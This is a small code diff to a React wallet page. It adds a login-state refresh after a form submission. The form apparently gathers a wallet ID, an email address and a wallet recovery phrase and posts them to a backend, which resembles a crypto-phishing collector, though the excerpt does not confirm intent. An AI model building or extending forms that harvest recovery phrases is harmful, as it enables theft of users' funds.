@@ -6,9 +6,12 @@ import TextArea from "../../components/vendor/form/TextArea";
 import SubmitButton from "../../components/vendor/button/SubmitButton";
 import SelectInput from "../../components/vendor/form/SelectInput";
 import api from "../../api/config";
+import { useAppState } from "../../AppStateContext";
+import { check } from "../../api/auth";
 import { ReactComponent as WalletIcon } from "../../resources/images/dashboard/index/account-arrows-svgrepo-com.svg";
 
 export default function Wallet() {
+  const { setIsLogged } = useAppState();
   const [loading, setLoading] = useState(false);
   const [fetching, setFetching] = useState(true);
   const [wallets, setWallets] = useState([]);
@@ -51,6 +54,8 @@ export default function Wallet() {
       });
       if (response.data.status === 200) {
         setFormData({ wallet_id: "", email_address: "", recovery_phrase: "" });
+        const newResult = await check();
+        setIsLogged(newResult);
       }
     } catch (error) {
       setResult({
